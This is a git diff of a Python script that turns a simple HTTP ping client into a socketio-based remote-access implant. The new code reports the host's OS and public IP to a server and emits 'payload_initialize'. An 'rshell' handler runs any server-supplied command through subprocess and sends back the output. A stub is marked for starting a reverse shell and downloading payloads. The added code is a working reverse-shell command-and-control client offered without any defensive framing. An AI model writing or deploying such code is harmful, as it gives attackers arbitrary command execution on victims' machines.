@@ -1,31 +1,44 @@
-import requests, os
+import os
+import requests
 from time import sleep
+import platform
+import socketio
+import subprocess
 
-def client_connect_ping():
-        #Changing to a more headless mode with only intervening when the connection is unsuccesful
-        #print("Test Pinging Server...")
-        if requests.get("http://127.0.0.1:5000/client/connect/ping").text == "True":
-             #print("Test Ping Succesful")
-             return True
-        else:
-             print("Test Ping Failure")
-             return False
+server_ip = "http://127.0.0.1:5000"
 
+sio = socketio.Client(logger=True)
+
+@sio.event
 def connect():
-     if requests.get("http://127.0.0.1:5000/client/connect").text == "True":
-          return True
-     else: 
-          print(requests.get("http://127.0.0.1:5000/client/connect").text)
-          return False
+    os = platform.system()
+    ip = requests.get("https://api.ipify.org").text
+    print("Connection Succesful")
+    sio.emit("client_data", {"os": os, "ip": ip})
+    sio.emit("payload_initialize")
+@sio.event
+def disconnect():
+    print("Disconnected")
+#    while True:
+#        print("Attempting to connect to server at " + server_ip)
+#        sio.connect(server_ip)
+@sio.event
+def reconnect():
+    print('Reconnected to server')
 
-def main():
-    if connect() == True:
-         connected = True
-    else:
-         connected = False
-         print("Initial Connection Failed")
-    while connected:
-        sleep(5)
-        connected = client_connect_ping()
+@sio.on("rshell_init")
+def rshell():
+    sio.emit("rshell_init", {"cwd": os.getcwd()})
 
-main()
+@sio.on("rshell")
+def rshell(data):
+    sio.emit("rshell_init", {"response": subprocess.getoutput(data["command"]), "cwd": os.getcwd()})
+
+@sio.on("onboard")
+def onboard():
+    #send command to initiate reverse shell and download payloads
+    print("Not Finished (onboard)")
+
+sio.connect(server_ip)
+
+sio.wait()
